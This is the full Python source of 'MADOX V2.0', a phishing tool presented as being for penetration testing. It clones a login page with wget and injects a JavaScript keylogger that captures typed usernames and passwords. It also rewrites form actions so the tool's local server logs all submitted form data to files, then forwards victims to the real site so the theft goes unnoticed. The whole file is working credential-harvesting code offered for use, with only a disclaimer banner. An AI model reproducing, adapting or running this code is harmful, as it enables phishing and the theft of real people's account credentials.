import os
import sys
import re
import time
import signal
import http.server
import socketserver
import urllib.parse
from termcolor import colored
import subprocess
import colorama

colorama.init()

CLONE_DIR = "clone"
POST_FILE = "captured_post.txt"
KEYLOG_FILE = "captured_log.txt"
DEFAULT_USER_AGENT = "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/60.0"
DEFAULT_PORT = 5000
DEFAULT_HOST = "0.0.0.0"  # Listen on all interfaces by default

def clear_screen():
   os.system('cls' if os.name == 'nt' else 'clear')

def madox(typing_speed=0.002):
    art = r""" 


███╗   ███╗ █████╗ ██████╗  ██████╗ ██╗  ██╗
████╗ ████║██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝
██╔████╔██║███████║██║  ██║██║   ██║ ╚███╔╝ 
██║╚██╔╝██║██╔══██║██║  ██║██║   ██║ ██╔██╗ 
██║ ╚═╝ ██║██║  ██║██████╔╝╚██████╔╝██╔╝ ██╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝  V2.0
 """
    for line in art.splitlines():
        for char in line:
            sys.stdout.write(colored(char, "red", attrs=["bold"]))
            sys.stdout.flush()
            time.sleep(typing_speed)
        print()

def message(typing_speed=0.002, pause_time=2):
   text1 = "This is a tool for cloning login pages of websites and capuring user credentials for penetration testing. ;)\n"
   text2 = "This tool was developed by OPTIMUS07. https://github.com/OSBORNNARTEY/MADOX2.\n"
   text3 = "I am not responsible for any misuse of this tool. Happy Hacking ;)\n"
   for char in text1:
      sys.stdout.write(colored(char, "red", attrs=["bold"]))
      sys.stdout.flush()
      time.sleep(typing_speed)
   time.sleep(pause_time)

   for char in text2:
      sys.stdout.write(colored(char, "red", attrs=["bold"]))
      sys.stdout.flush()
      time.sleep(typing_speed)
   time.sleep(pause_time)

   for char in text3:
      sys.stdout.write(colored(char, "red", attrs=["bold"]))
      sys.stdout.flush()
      time.sleep(typing_speed)
   time.sleep(pause_time)


def create_directory(path):
    """Create directory if it doesn't exist"""
    if not os.path.exists(path):
        os.makedirs(path)
        return True
    return False

def clone_website():
    """Clone a new website using wget"""
    print(colored("\n[+] Cloning a new website", "blue"))
    
    url = input(colored("[?] Enter the full URL to clone: ", "green")).strip()
    if not url:
        print(colored("[-] URL is required", "red"))
        return None
    
    site_name = input(colored("[?] Enter a name for this clone: ", "green")).strip()
    if not site_name:
        print(colored("[-] Clone name is required", "red"))
        return None
    
    user_agent = input(colored(f"[?] User agent (default: {DEFAULT_USER_AGENT}): ", "green")).strip()
    if not user_agent:
        user_agent = DEFAULT_USER_AGENT
    
    # Create clone directory
    clone_path = os.path.join(CLONE_DIR, site_name)
    create_directory(clone_path)
    
    print(colored(f"[*] Downloading website to {clone_path}...", "blue"))
    
    # Build wget command
    wget_cmd = [
        "wget", 
        "-E", "-H", "-k", "-K", "-p", "-nH", "--cut-dirs=100", "-nv",
        "--user-agent", user_agent,
        "--directory-prefix", clone_path,
        url
    ]
    
    try:
        # Execute wget command
        result = subprocess.run(wget_cmd, capture_output=True, text=True, timeout=300)
        
        if result.returncode != 0:
            print(colored(f"[-] wget failed: {result.stderr}", "red"))
            return None
            
        print(colored("[+] Website cloned successfully", "green"))
        return clone_path
        
    except subprocess.TimeoutExpired:
        print(colored("[-] Website cloning timed out", "red"))
        return None
    except Exception as e:
        print(colored(f"[-] Error during cloning: {str(e)}", "red"))
        return None

def select_existing_clone():
    """Let user select from existing clones"""
    if not os.path.exists(CLONE_DIR):
        print(colored("[-] No existing clones found", "red"))
        return None
    
    clones = [d for d in os.listdir(CLONE_DIR) 
              if os.path.isdir(os.path.join(CLONE_DIR, d))]
    
    if not clones:
        print(colored("[-] No existing clones found", "red"))
        return None
    
    print(colored("\n[+] Available clones:", "blue"))
    for i, clone in enumerate(clones, 1):
        print(colored(f"    {i}. {clone}", "white"))
    
    try:
        choice = int(input(colored("\n[?] Select a clone (number): ", "green")))
        if 1 <= choice <= len(clones):
            return os.path.join(CLONE_DIR, clones[choice-1])
        else:
            print(colored("[-] Invalid selection", "red"))
            return None
    except ValueError:
        print(colored("[-] Please enter a valid number", "red"))
        return None

def ensure_index_html(clone_path):
    """Ensure there's a valid index.html in the clone directory"""
    html_files = []
    for root, dirs, files in os.walk(clone_path):
        for file in files:
            if file.endswith(('.html', '.htm')):
                html_files.append(os.path.join(root, file))
    
    if not html_files:
        print(colored("[-] No HTML files found in the clone", "red"))
        return None
    
    # Create the path for the new index.html in the clone directory
    new_index_path = os.path.join(clone_path, 'index.html')
    
    if len(html_files) == 1:
        # If there's only one HTML file, rename it to index.html
        old_path = html_files[0]
        if old_path != new_index_path:
            os.rename(old_path, new_index_path)
        return new_index_path
    
    print(colored("\n[+] Multiple HTML files found:", "blue"))
    for i, file in enumerate(html_files, 1):
        print(colored(f"    {i}. {os.path.basename(file)}", "white"))
    
    try:
        choice = int(input(colored("\n[?] Select which file to use as index.html (number): ", "green")))
        if 1 <= choice <= len(html_files):
            old_path = html_files[choice-1]
            if old_path != new_index_path:
                os.rename(old_path, new_index_path)
            return new_index_path
        else:
            print(colored("[-] Invalid selection", "red"))
            return None
    except ValueError:
        print(colored("[-] Please enter a valid number", "red"))
        return None

def inject_keylogger(index_path):
    """Inject JavaScript keylogger to capture plaintext passwords"""
    try:
        with open(index_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # JavaScript browser keylogger to capture entered credentials
        keylogger_js = """
        <script>
        // Capture plaintext passwords before form submission
        (function() {
            // Store captured passwords
            var capturedPasswords = {};
            
            // Function to send captured data to server
            function sendCapturedData(username, password, formAction) {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/capture_plaintext', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('username=' + encodeURIComponent(username) + 
                         '&password=' + encodeURIComponent(password) + 
                         '&form_action=' + encodeURIComponent(formAction));
            }
            
            // Find all password fields and attach event listeners
            var passwordFields = document.querySelectorAll('input[type="password"]');
            passwordFields.forEach(function(field) {
                // Store the original value to compare changes
                field.dataset.originalValue = field.value;
                
                // Capture password on input
                field.addEventListener('input', function(e) {
                    capturedPasswords[field.name || field.id] = e.target.value;
                });
                
                // Also capture on blur (when field loses focus)
                field.addEventListener('blur', function(e) {
                    capturedPasswords[field.name || field.id] = e.target.value;
                });
            });
            
            // Intercept form submissions
            var forms = document.querySelectorAll('form');
            forms.forEach(function(form) {
                form.addEventListener('submit', function(e) {
                    // Try to find username/email field
                    var usernameField = form.querySelector('input[type="email"], input[type="text"][name*="user"], input[type="text"][name*="mail"], input[name*="user"], input[name*="mail"]');
                    var username = usernameField ? usernameField.value : 'unknown';
                    
                    // Try to find the matching password
                    var password = '';
                    var passwordFields = form.querySelectorAll('input[type="password"]');
                    if (passwordFields.length > 0) {
                        password = passwordFields[0].value;
                    } else {
                        // Check our captured passwords
                        for (var key in capturedPasswords) {
                            if (capturedPasswords.hasOwnProperty(key)) {
                                password = capturedPasswords[key];
                                break;
                            }
                        }
                    }
                    
                    // Send captured plaintext credentials
                    if (password) {
                        sendCapturedData(username, password, form.action);
                    }
                    
                    // Let the form submit continue normally
                });
            });
        })();
        </script>
        """
        
        # Inject the JavaScript just before the closing </body> tag
        if '</body>' in content:
            modified_content = content.replace('</body>', keylogger_js + '</body>')
        else:
            # If no body tag, append to the end of the file
            modified_content = content + keylogger_js
        
        # Write modified content back to file
        with open(index_path, 'w', encoding='utf-8') as f:
            f.write(modified_content)
        
        print(colored("[+] JavaScript keylogger injected successfully", "green"))
        return True
        
    except Exception as e:
        print(colored(f"[-] Error injecting keylogger: {str(e)}", "red"))
        return False

def modify_forms(index_path, original_url):
    """Modify form actions to capture POST requests and redirect properly"""
    try:
        with open(index_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Parse the original URL to get domain and base path
        parsed_url = urllib.parse.urlparse(original_url)
        original_domain = parsed_url.netloc
        original_scheme = parsed_url.scheme
        original_path = parsed_url.path
        
        # Pattern to match form actions
        form_pattern = r'(<form[^>]*?action=")([^"]*)("[^>]*>)'
        
        def form_replacer(match):
            form_opening = match.group(1)
            form_action = match.group(2)
            form_closing = match.group(3)
            
            # If form action is relative, make it absolute
            if form_action.startswith('/'):
                form_action = f"{original_scheme}://{original_domain}{form_action}"
            elif not form_action.startswith(('http://', 'https://')):
                # Handle relative paths without leading slash
                base_path = original_path.rsplit('/', 1)[0] if '/' in original_path else ''
                form_action = f"{original_scheme}://{original_domain}{base_path}/{form_action}"
            
            # Replace with our handler that will capture data and redirect
            return f'{form_opening}/capture_form_data{form_closing}'
        
        # Replace form actions
        modified_content = re.sub(form_pattern, form_replacer, content, flags=re.IGNORECASE)
        
        # Write modified content back to file
        with open(index_path, 'w', encoding='utf-8') as f:
            f.write(modified_content)
        
        print(colored("[+] Form actions modified successfully", "green"))
        return True
        
    except Exception as e:
        print(colored(f"[-] Error modifying forms: {str(e)}", "red"))
        return False

class PhishingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP request handler for phishing simulation"""
    
    def __init__(self, *args, **kwargs):
        self.original_url = kwargs.pop('original_url')
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Handle GET requests"""
        print(colored(f"[*] GET request: {self.path}", "blue"))
        
        # Serve local files if available
        if os.path.exists(self.translate_path(self.path)):
            super().do_GET()
        else:
            # Redirect to original site if file not found
            parsed_original = urllib.parse.urlparse(self.original_url)
            redirect_url = f"{parsed_original.scheme}://{parsed_original.netloc}{self.path}"
            print(colored(f"[*] Redirecting to: {redirect_url}", "yellow"))
            self.send_response(301)
            self.send_header('Location', redirect_url)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests - capture form data and redirect to original site"""
        if self.path == "/capture_form_data":
            print(colored("[*] Form submission captured", "blue"))
            
            # Parse form data
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                # Parse the form data
                parsed_data = urllib.parse.parse_qs(post_data.decode())
                
                # Log all form data
                with open(POST_FILE, 'a') as f:
                    f.write(f"Time: {time.ctime()}\n")
                    f.write(f"Form Data:\n")
                    for key, values in parsed_data.items():
                        for value in values:
                            f.write(f"  {key}: {value}\n")
                    f.write("-" * 50 + "\n")
                
                print(colored("[+] Form data captured and saved", "green"))
                
                # Redirect to original form action with the same data
                # This requires JavaScript to automatically resubmit the form
                response_html = """
                <html>
                    <head>
                        <title>Redirecting...</title>
                        <script type="text/javascript">
                            function submitForm() {
                                document.getElementById('redirectForm').submit();
                            }
                        </script>
                    </head>
                    <body onload="submitForm()">
                        <form id="redirectForm" action="{action_url}" method="POST">
                            {form_fields}
                        </form>
                        <p>Redirecting to original site...</p>
                    </body>
                </html>
                """
                
                # Get the Referer header to determine the original form action
                referer = self.headers.get('Referer', '')
                if referer:
                    # Extract the original form action from the referer
                    parsed_referer = urllib.parse.urlparse(referer)
                    original_domain = parsed_referer.netloc
                    original_scheme = parsed_referer.scheme
                    
                    # Reconstruct the original form action URL
                    action_url = f"{original_scheme}://{original_domain}/"
                    
                    # Generate hidden form fields with the captured data
                    form_fields = ""
                    for key, values in parsed_data.items():
                        for value in values:
                            form_fields += f'<input type="hidden" name="{key}" value="{value}">\n'
                    
                    # Complete the response HTML
                    response_html = response_html.format(
                        action_url=action_url,
                        form_fields=form_fields
                    )
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(response_html.encode('utf-8'))
                else:
                    # Fallback: redirect to the original URL
                    self.send_response(303)
                    self.send_header('Location', self.original_url)
                    self.end_headers()
                    
            except Exception as e:
                print(colored(f"[-] Error processing form data: {str(e)}", "red"))
                # Fallback: redirect to the original URL
                self.send_response(303)
                self.send_header('Location', self.original_url)
                self.end_headers()
                
        elif self.path == "/capture_plaintext":
            # Handle plaintext credential capture from JavaScript keylogger
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                # Parse the plaintext data
                parsed_data = urllib.parse.parse_qs(post_data.decode())
                
                # Extract credentials
                username = parsed_data.get('username', ['unknown'])[0]
                password = parsed_data.get('password', [''])[0]
                form_action = parsed_data.get('form_action', ['unknown'])[0]
                
                # Log plaintext credentials
                with open(KEYLOG_FILE, 'a') as f:
                    f.write(f"Time: {time.ctime()}\n")
                    f.write(f"Username: {username}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"Form Action: {form_action}\n")
                    f.write("-" * 50 + "\n")
                
                print(colored(f"[+] Plaintext credentials captured: {username}:{password}", "green"))
                
                # Send success response
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"OK")
                
            except Exception as e:
                print(colored(f"[-] Error processing plaintext data: {str(e)}", "red"))
                self.send_response(500)
                self.end_headers()
                
        else:
            # For other POST requests, redirect to original site
            parsed_original = urllib.parse.urlparse(self.original_url)
            redirect_url = f"{parsed_original.scheme}://{parsed_original.netloc}{self.path}"
            self.send_response(303)
            self.send_header('Location', redirect_url)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Disable default logging"""
        return

def run_server(clone_path, original_url, host=DEFAULT_HOST, port=DEFAULT_PORT):
    """Run the HTTP server"""
    os.chdir(clone_path)
    
    # Create a custom handler class that knows about the original_url
    class Handler(PhishingHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, original_url=original_url, **kwargs)
    
    try:
        httpd = socketserver.TCPServer((host, port), Handler)
        print(colored(f"\n[+] Server running at http://{host}:{port}", "green"))
        print(colored("[+] Press Ctrl+C to stop the server", "yellow"))
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(colored("\n[*] Server stopped", "red"))
            httpd.shutdown()
            return True  # Return to main menu
    except OSError as e:
        if "Address already in use" in str(e):
            print(colored(f"[-] Port {port} is already in use. Please choose a different port.", "red"))
        else:
            print(colored(f"[-] Error starting server: {str(e)}", "red"))
        return False
    except Exception as e:
        print(colored(f"[-] Error running server: {str(e)}", "red"))
        return False  # Return to main menu

def main_menu():
    """Display the main menu and handle user choices"""
    while True:
        clear_screen()
        madox(typing_speed=0.009)
        message(typing_speed=0.08, pause_time=2)
        
        print("")
        print(colored("[+] Make a choice?", "blue"))
        print(colored("    1. Clone a new website", "white"))
        print(colored("    2. Use an existing clone", "white"))
        print(colored("    3. Exit", "white"))
        
        choice = input(colored("\n[?] Enter your choice (1-3): ", "green")).strip()
        
        if choice == "1":
            clone_path = clone_website()
            if not clone_path:
                input(colored("\n[!] Press Enter to continue...", "yellow"))
                continue
        elif choice == "2":
            clone_path = select_existing_clone()
            if not clone_path:
                input(colored("\n[!] Press Enter to continue...", "yellow"))
                continue
        elif choice == "3":
            clear_screen()
            print(colored("\n[+] Thank you for using MADOX!. Cyber Space is our domain", "green"))
            break
        else:
            print(colored("[-] Invalid choice", "red"))
            input(colored("\n[!] Press Enter to continue...", "yellow"))
            continue
        
        # Find index.html
        index_path = ensure_index_html(clone_path)
        if not index_path:
            input(colored("\n[!] Press Enter to continue...", "yellow"))
            continue
        
        # Get original URL
        original_url = input(colored("\n[?] Enter the original website URL: ", "green")).strip()
        if not original_url:
            print(colored("[-] Original URL is required", "red"))
            input(colored("\n[!] Press Enter to continue...", "yellow"))
            continue
        
        # Inject JavaScript keylogger to capture plaintext passwords
        if not inject_keylogger(index_path):
            input(colored("\n[!] Press Enter to continue...", "yellow"))
            continue
        
        # Modify form actions
        if not modify_forms(index_path, original_url):
            input(colored("\n[!] Press Enter to continue...", "yellow"))
            continue
        
        # Get server configuration
        host = input(colored(f"[?] Enter IP address to host on (default: {DEFAULT_HOST}): ", "green")).strip()
        if not host:
            host = DEFAULT_HOST
            
        port_input = input(colored(f"[?] Enter port number (default: {DEFAULT_PORT}): ", "green")).strip()
        port = int(port_input) if port_input.isdigit() else DEFAULT_PORT
        
        print(colored("\n[+] Starting server...", "blue"))
        
        # Run the server and check if it returns (which happens when server is stopped)
        if run_server(clone_path, original_url, host, port):
            # Server was stopped, return to main menu
            input(colored("\n[!] Press Enter to return to main menu...", "yellow"))

def main():
    """Main function"""
    try:
        main_menu()
    except KeyboardInterrupt:
        print(colored("\n[-] Operation cancelled by user", "red"))
        sys.exit(1)
    except Exception as e:
        print(colored(f"\n[-] Unexpected error: {str(e)}", "red"))
        sys.exit(1)

if __name__ == "__main__":
    main()
